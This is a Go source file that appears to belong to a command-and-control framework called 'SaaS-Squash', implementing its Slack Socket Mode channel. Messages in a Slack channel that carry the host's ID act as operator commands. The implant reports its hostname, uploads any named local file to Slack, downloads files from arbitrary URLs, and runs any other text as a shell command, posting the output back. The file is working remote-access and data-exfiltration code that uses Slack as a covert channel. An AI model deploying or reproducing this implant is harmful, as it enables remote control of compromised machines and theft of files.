package slack

import (
	"SaaS-Squash/common"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/slack-go/slack"
	"github.com/slack-go/slack/slackevents"
	"github.com/slack-go/slack/socketmode"
)

// This is a work in progress to get away from the Legacy App RTM and use Socket Mode.
// Currently it only works with mentions and not channel messages.
func StartSocket() {
	var api *slack.Client
	var client *socketmode.Client
	common.AllC2Configs.Debug.LogDebug("App Token: " + common.AllC2Configs.Slack.AppToken + "\nAuthToken: " + common.AllC2Configs.Slack.AuthToken + "\n")
	if common.AllC2Configs.Debug.Enable {
		api = slack.New(common.AllC2Configs.Slack.AuthToken, slack.OptionDebug(true), slack.OptionAppLevelToken(common.AllC2Configs.Slack.AppToken))
		client = socketmode.New(
			api,
			socketmode.OptionDebug(true),
		)
	} else {
		api = slack.New(common.AllC2Configs.Slack.AuthToken, slack.OptionDebug(false), slack.OptionAppLevelToken(common.AllC2Configs.Slack.AppToken))
		client = socketmode.New(
			api,
			socketmode.OptionDebug(false),
		)
	}

	socketmodeHandler := socketmode.NewSocketmodeHandler(client)

	socketmodeHandler.Handle(socketmode.EventTypeConnecting, middlewareConnecting)
	socketmodeHandler.Handle(socketmode.EventTypeConnectionError, middlewareConnectionError)
	socketmodeHandler.Handle(socketmode.EventTypeConnected, middlewareConnected)

	//\\ EventTypeEventsAPI //\\
	// Handle all EventsAPI
	socketmodeHandler.Handle(socketmode.EventTypeEventsAPI, middlewareEventsAPI)

	// Handle a specific event from EventsAPI
	socketmodeHandler.HandleEvents(slackevents.AppMention, middlewareAppMentionEvent)
	socketmodeHandler.HandleEvents(slackevents.Message, middlewareMessageEvent)
	//\\ EventTypeInteractive //\\
	// Handle all Interactive Events
	socketmodeHandler.Handle(socketmode.EventTypeInteractive, middlewareInteractive)

	// Handle a specific Interaction
	socketmodeHandler.HandleInteraction(slack.InteractionTypeBlockActions, middlewareInteractionTypeBlockActions)

	// // Handle all SlashCommand
	// socketmodeHandler.Handle(socketmode.EventTypeSlashCommand, middlewareSlashCommand)
	// socketmodeHandler.HandleSlashCommand("/rocket", middlewareSlashCommand)

	// socketmodeHandler.HandleDefault(middlewareDefault)

	err := socketmodeHandler.RunEventLoop()
	if err != nil {
		common.AllC2Configs.Debug.LogDebugError("Slack: Error: ", err)
		return
	}

}

func middlewareConnecting(evt *socketmode.Event, client *socketmode.Client) {
	common.AllC2Configs.Debug.LogDebug("Connecting to Slack with Socket Mode...")
}

func middlewareConnectionError(evt *socketmode.Event, client *socketmode.Client) {
	common.AllC2Configs.Debug.LogDebug("Connection failed. Retrying later...")
}

func middlewareConnected(evt *socketmode.Event, client *socketmode.Client) {
	common.AllC2Configs.Debug.LogDebug("Connected to Slack with Socket Mode.")
}

func middlewareEventsAPI(evt *socketmode.Event, client *socketmode.Client) {
	common.AllC2Configs.Debug.LogDebug("middlewareEventsAPI")
	eventsAPIEvent, ok := evt.Data.(slackevents.EventsAPIEvent)
	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + evt.Request.Type + " request from Slack")

		return
	}

	common.AllC2Configs.Debug.LogDebug("Event received: " + eventsAPIEvent.Type + " \n")

	client.Ack(*evt.Request)

	switch eventsAPIEvent.Type {
	case slackevents.CallbackEvent:
		innerEvent := eventsAPIEvent.InnerEvent
		switch ev := innerEvent.Data.(type) {
		case *slackevents.AppMentionEvent:
			common.AllC2Configs.Debug.LogDebug("We have been mentionned in " + ev.Channel)
			_, _, err := client.Client.PostMessage(ev.Channel, slack.MsgOptionText("Yes, hello.", false))
			if err != nil {
				common.AllC2Configs.Debug.LogDebug("failed posting message: " + err.Error())
			}
		case *slackevents.MemberJoinedChannelEvent:
			common.AllC2Configs.Debug.LogDebug("user " + ev.User + " joined to channel " + ev.Channel)

		case *slackevents.MessageEvent:
			if strings.HasPrefix(ev.Text, common.AllC2Configs.UUID.HostID) {

				//Trim whitespace and split the arguments
				command := strings.Split(strings.TrimSpace(strings.TrimPrefix(ev.Text, common.AllC2Configs.UUID.HostID)), " ")

				switch {
				case strings.Contains(command[0], "chekin"):
					client.PostMessage(ev.Channel, slack.MsgOptionText("Bot: "+common.AllC2Configs.UUID.HostID+" Hostname: "+common.AllC2Configs.UUID.HostName+"\n", false))
				case strings.Contains(command[0], common.AllC2Configs.Slack.Upload):
					file, err := os.Open(command[1])
					if err != nil {
						common.AllC2Configs.Debug.LogDebug("Failed to open file: " + err.Error())
						return
					}
					defer file.Close()

					_, err = client.UploadFile(slack.FileUploadParameters{
						Reader:   file,
						Filename: command[1],
						Channels: []string{ev.Channel},
					})
					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack - Failed to upload file: ", err)
					}

				case strings.Contains(command[0], common.AllC2Configs.Slack.Download):
					resp, err := http.Get(command[1])
					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack - Failed to download file: ", err)
						return
					}
					defer resp.Body.Close()

					out, err := os.Create("downloaded_file")
					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack - Failed to create file: ", err)
						return
					}
					defer out.Close()

					_, err = io.Copy(out, resp.Body)
					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack - Failed to write file: ", err)
						return

					}

				default:
					commands_joined := strings.Join(command, " ")
					output, err := common.ExecuteCommand(commands_joined)

					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to execute command: ", err)
						return
					}
					_, _, err = client.Client.PostMessage(ev.Channel, slack.MsgOptionText(output, false))
					if err != nil {
						common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to post message: ", err)
						return
					}
				}

			}

		default:
			common.AllC2Configs.Debug.LogDebug("unsupported Events API event received")
		}
	}
}

func HandleAppMentionEventToBot(event *slackevents.AppMentionEvent, client *slack.Client) error {

	user, err := client.GetUserInfo(event.User)
	if err != nil {
		return err
	}

	text := strings.ToLower(event.Text)

	attachment := slack.Attachment{}

	if strings.Contains(text, "hello") || strings.Contains(text, "hi") {
		attachment.Text = fmt.Sprintf("Hello %s", user.Name)
		attachment.Color = "#4af030"
	} else if strings.Contains(text, "weather") {
		attachment.Text = fmt.Sprintf("Weather is sunny today. %s", user.Name)
		attachment.Color = "#4af030"
	} else {
		attachment.Text = fmt.Sprintf("I am good. How are you %s?", user.Name)
		attachment.Color = "#4af030"
	}
	_, _, err = client.PostMessage(event.Channel, slack.MsgOptionAttachments(attachment))
	if err != nil {
		common.AllC2Configs.Debug.LogDebugError("Slack: failed to post message: %w", err)
	}
	return nil
}
func middlewareMessageEvent(evt *socketmode.Event, client *socketmode.Client) {

	eventMessageEvent, ok := evt.Data.(slackevents.MessageEvent)
	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + evt.Request.Type + " request from Slack")
		return
	}
	client.Ack(*evt.Request)

	ev := eventMessageEvent

	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + ev.Text)
		return
	}

	common.AllC2Configs.Debug.LogDebug("We have been mentionned in " + ev.Channel)
	_, _, err := client.Client.PostMessage(ev.Channel, slack.MsgOptionText("Yes, hello.", false))
	if err != nil {
		common.AllC2Configs.Debug.LogDebug("failed posting message: " + err.Error())
	}
}
func middlewareAppMentionEvent(evt *socketmode.Event, client *socketmode.Client) {

	eventsAPIEvent, ok := evt.Data.(slackevents.EventsAPIEvent)
	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + eventsAPIEvent.Type)
		return
	}

	client.Ack(*evt.Request)
	ev, ok := eventsAPIEvent.InnerEvent.Data.(*slackevents.AppMentionEvent)
	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + ev.Text)
		return
	}
	common.AllC2Configs.Debug.LogDebug("Slack: We have been mentionned in " + ev.Channel)
	_, _, err := client.Client.PostMessage(ev.Channel, slack.MsgOptionText("Channel: "+ev.Channel+" Text: "+ev.Text, false))
	if err != nil {
		common.AllC2Configs.Debug.LogDebug("failed posting message: " + err.Error())
	}
}

func middlewareInteractive(evt *socketmode.Event, client *socketmode.Client) {
	callback, ok := evt.Data.(slack.InteractionCallback)
	if !ok {
		common.AllC2Configs.Debug.LogDebug("Slack: Ignored " + string(evt.Type))
		return
	}

	common.AllC2Configs.Debug.LogDebug("Interaction received: " + callback.Message.Text)

	var payload interface{}

	switch callback.Type {
	case slack.InteractionTypeBlockActions:
		// See https://api.slack.com/apis/connections/socket-implement#button
		client.Debugf("button clicked!")
	case slack.InteractionTypeShortcut:
	case slack.InteractionTypeViewSubmission:
		// See https://api.slack.com/apis/connections/socket-implement#modal
	case slack.InteractionTypeDialogSubmission:
	default:

	}

	client.Ack(*evt.Request, payload)
}

func middlewareInteractionTypeBlockActions(evt *socketmode.Event, client *socketmode.Client) {
	client.Debugf("button clicked!")
}

// func middlewareSlashCommand(evt *socketmode.Event, client *socketmode.Client) {
// 	cmd, ok := evt.Data.(slack.SlashCommand)
// 	if !ok {
// 		common.AllC2Configs.Debug.LogDebug("Ignored %+v\n", evt)
// 		return
// 	}

// 	client.Debugf("Slash command received: %+v", cmd)

// 	payload := map[string]interface{}{
// 		"blocks": []slack.Block{
// 			slack.NewSectionBlock(
// 				&slack.TextBlockObject{
// 					Type: slack.MarkdownType,
// 					Text: "foo",
// 				},
// 				nil,
// 				slack.NewAccessory(
// 					slack.NewButtonBlockElement(
// 						"",
// 						"somevalue",
// 						&slack.TextBlockObject{
// 							Type: slack.PlainTextType,
// 							Text: "bar",
// 						},
// 					),
// 				),
// 			),
// 		}}
// 	client.Ack(*evt.Request, payload)
// }

// func middlewareDefault(evt *socketmode.Event, client *socketmode.Client) {
// 	// fmt.Fprintf(os.Stderr, "Unexpected event type received: %s\n", evt.Type)
// }
